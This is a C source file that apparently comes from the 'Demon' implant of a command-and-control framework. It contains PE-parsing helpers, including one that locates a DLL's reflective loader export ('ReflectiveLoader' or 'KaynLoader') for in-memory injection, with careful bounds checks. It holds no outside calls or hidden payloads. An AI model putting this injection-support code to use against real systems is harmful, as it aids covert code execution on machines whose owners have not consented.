#include <Demon.h>

#include <core/MiniStd.h>
#include <core/Package.h>
#include <inject/InjectUtil.h>
#include <common/Defines.h>

#ifndef _WIN32
typedef ULONG NTSTATUS;
#endif

/* validates that a buffer of uiSize bytes at uiBaseAddress holds a DOS
 * header plus an NT header that fits inside the buffer. returns the byte
 * offset of the NT headers, or 0 when the buffer is too small / not a PE.
 * every caller treats offset 0 as invalid, which e_lfanew == 0 (inside the
 * DOS header itself) also is. */
static UINT_PTR PeNtHeadersOffset( UINT_PTR uiBaseAddress, SIZE_T uiSize )
{
    LONG e_lfanew = 0;

    if ( ! uiBaseAddress || uiSize < sizeof( IMAGE_DOS_HEADER ) )
        return 0;

    if ( DEREF_16( uiBaseAddress ) != 0x5A4D ) /* 'MZ' */
        return 0;

    e_lfanew = ( ( PIMAGE_DOS_HEADER ) uiBaseAddress )->e_lfanew;

    /* e_lfanew is signed and attacker controlled: reject negatives as well
     * as headers that run past the end of the buffer */
    if ( e_lfanew <= 0 )
        return 0;

    if ( ( ULONGLONG ) e_lfanew + sizeof( IMAGE_NT_HEADERS ) > uiSize )
        return 0;

    return ( UINT_PTR ) e_lfanew;
}

DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress, SIZE_T uiSize )
{
    PIMAGE_SECTION_HEADER   ImageSectionHeader;
    PIMAGE_NT_HEADERS       ImageNtHeaders;
    UINT_PTR                NtHeadersOffset = 0;
    ULONGLONG               SectionTableEnd = 0;
    WORD                    NumberOfSections = 0;

    NtHeadersOffset = PeNtHeadersOffset( uiBaseAddress, uiSize );
    if ( NtHeadersOffset == 0 )
        return 0;

    ImageNtHeaders = RVA( PIMAGE_NT_HEADERS, uiBaseAddress, NtHeadersOffset );

    NumberOfSections = ImageNtHeaders->FileHeader.NumberOfSections;
    if ( NumberOfSections == 0 )
        return 0;

    /* the section array must sit entirely inside the buffer before any
     * ImageSectionHeader[ i ] deref */
    SectionTableEnd = ( ULONGLONG ) NtHeadersOffset +
                      FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +
                      ImageNtHeaders->FileHeader.SizeOfOptionalHeader +
                      ( ULONGLONG ) NumberOfSections * sizeof( IMAGE_SECTION_HEADER );
    if ( SectionTableEnd > uiSize )
        return 0;

    ImageSectionHeader = RVA( PIMAGE_SECTION_HEADER, &ImageNtHeaders->OptionalHeader, ImageNtHeaders->FileHeader.SizeOfOptionalHeader );

    if ( dwRva < ImageSectionHeader[ 0 ].PointerToRawData )
        return dwRva;

    for ( WORD wIndex = 0; wIndex < NumberOfSections; wIndex++ )
    {
        DWORD    VirtualAddress = ImageSectionHeader[ wIndex ].VirtualAddress;
        // a hostile/corrupt section header can push the 32-bit end offset
        // past 4 GB and wrap it back below dwRva: compare in 64 bits so a
        // wrapped range can never match
        ULONGLONG SectionEnd = ( ULONGLONG ) VirtualAddress + ImageSectionHeader[ wIndex ].SizeOfRawData;

        if ( dwRva >= VirtualAddress && ( ULONGLONG ) dwRva < SectionEnd )
        {
            return ( dwRva - VirtualAddress + ImageSectionHeader[ wIndex ].PointerToRawData );
        }
    }

    return 0;
}

/* returns TRUE when a NUL byte exists within Length bytes at Buffer, so
 * string helpers walking to the terminator stay inside the PE buffer */
static BOOL PeStringTerminated( PCHAR Buffer, SIZE_T Length )
{
    for ( SIZE_T Index = 0; Index < Length; Index++ )
    {
        if ( Buffer[ Index ] == 0 )
            return TRUE;
    }

    return FALSE;
}

DWORD GetReflectiveLoaderOffset( PVOID ReflectiveLdrAddr, SIZE_T Size )
{
    PIMAGE_NT_HEADERS       NtHeaders           = NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDir           = NULL;
    UINT_PTR                NtHeadersOffset     = 0;
    DWORD                   ExportDirOffset     = 0;
    DWORD                   NamesOffset         = 0;
    DWORD                   FunctionsOffset     = 0;
    DWORD                   OrdinalsOffset      = 0;
    DWORD                   FunctionCounter     = 0;

    NtHeadersOffset = PeNtHeadersOffset( ( UINT_PTR ) ReflectiveLdrAddr, Size );
    if ( NtHeadersOffset == 0 )
        return 0;

    NtHeaders = RVA( PIMAGE_NT_HEADERS, ReflectiveLdrAddr, NtHeadersOffset );

    if ( NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress == 0 )
        return 0;

    ExportDirOffset = Rva2Offset( NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress, ( UINT_PTR ) ReflectiveLdrAddr, Size );
    if ( ExportDirOffset == 0 || ( ULONGLONG ) ExportDirOffset + sizeof( IMAGE_EXPORT_DIRECTORY ) > Size )
        return 0;

    ExportDir = ReflectiveLdrAddr + ExportDirOffset;
    if ( ExportDir->NumberOfNames == 0 )
        return 0;

    NamesOffset    = Rva2Offset( ExportDir->AddressOfNames, ( UINT_PTR ) ReflectiveLdrAddr, Size );
    FunctionsOffset = Rva2Offset( ExportDir->AddressOfFunctions, ( UINT_PTR ) ReflectiveLdrAddr, Size );
    OrdinalsOffset = Rva2Offset( ExportDir->AddressOfNameOrdinals, ( UINT_PTR ) ReflectiveLdrAddr, Size );

    /* every export array we index into must sit entirely inside the
     * buffer, including its last element */
    if ( NamesOffset == 0 || FunctionsOffset == 0 || OrdinalsOffset == 0 )
        return 0;

    if ( ( ULONGLONG ) ExportDir->NumberOfNames * sizeof( DWORD ) + NamesOffset > Size )
        return 0;
    if ( ( ULONGLONG ) ExportDir->NumberOfNames * sizeof( WORD ) + OrdinalsOffset > Size )
        return 0;
    if ( ( ULONGLONG ) ExportDir->NumberOfFunctions * sizeof( DWORD ) + FunctionsOffset > Size )
        return 0;

    FunctionCounter = ExportDir->NumberOfNames;

    while ( FunctionCounter-- )
    {
        /* after the decrement FunctionCounter is the element index */
        DWORD NameIndex    = FunctionCounter;
        DWORD NameRva      = DEREF_32( ReflectiveLdrAddr + NamesOffset + NameIndex * sizeof( DWORD ) );
        DWORD NameOffset   = 0;
        WORD  Ordinal      = 0;
        PCHAR FunctionName = NULL;

        /* hash only NUL-terminated names: HashStringA reads until 0 and
         * would run past the buffer end on a truncated name */
        if ( NameRva == 0 )
            continue;

        NameOffset = Rva2Offset( NameRva, ( UINT_PTR ) ReflectiveLdrAddr, Size );
        if ( NameOffset == 0 || NameOffset >= Size ||
             ! PeStringTerminated( ReflectiveLdrAddr + NameOffset, Size - NameOffset ) )
            continue;

        FunctionName = ( PCHAR )( ReflectiveLdrAddr + NameOffset );
        //                                  ReflectiveLoader                             KaynLoader
        if ( HashStringA( FunctionName ) == 0xa6caa1c5 || HashStringA( FunctionName ) == 0xffe885ef )
        {
            DWORD FunctionRva = 0;

            PRINTF( "FunctionName => %s\n", FunctionName );

            Ordinal = DEREF_16( ReflectiveLdrAddr + OrdinalsOffset + NameIndex * sizeof( WORD ) );
            if ( Ordinal >= ExportDir->NumberOfFunctions )
                return 0;

            FunctionRva = DEREF_32( ReflectiveLdrAddr + FunctionsOffset + Ordinal * sizeof( DWORD ) );

            return Rva2Offset( FunctionRva, ( UINT_PTR ) ReflectiveLdrAddr, Size );
        }
    }

    return 0;
}

DWORD GetPeArch( PVOID PeBytes, SIZE_T Size )
{
    PIMAGE_NT_HEADERS NtHeader = NULL;
    DWORD             DllArch  = PROCESS_ARCH_UNKNOWN;
    UINT_PTR          NtHeadersOffset = 0;

    if( ! PeBytes ) {
        return DllArch;
    }

    NtHeadersOffset = PeNtHeadersOffset( ( UINT_PTR ) PeBytes, Size );
    if ( NtHeadersOffset == 0 ) {
        return DllArch;
    }

    NtHeader = ( PIMAGE_NT_HEADERS ) ( ( ( UINT_PTR ) PeBytes ) + NtHeadersOffset );

    if ( NtHeader->OptionalHeader.Magic == 0x010B ) {
        DllArch = PROCESS_ARCH_X86;
    } else if ( NtHeader->OptionalHeader.Magic == 0x020B ) {
        DllArch = PROCESS_ARCH_X64;
    }

    return DllArch;
}
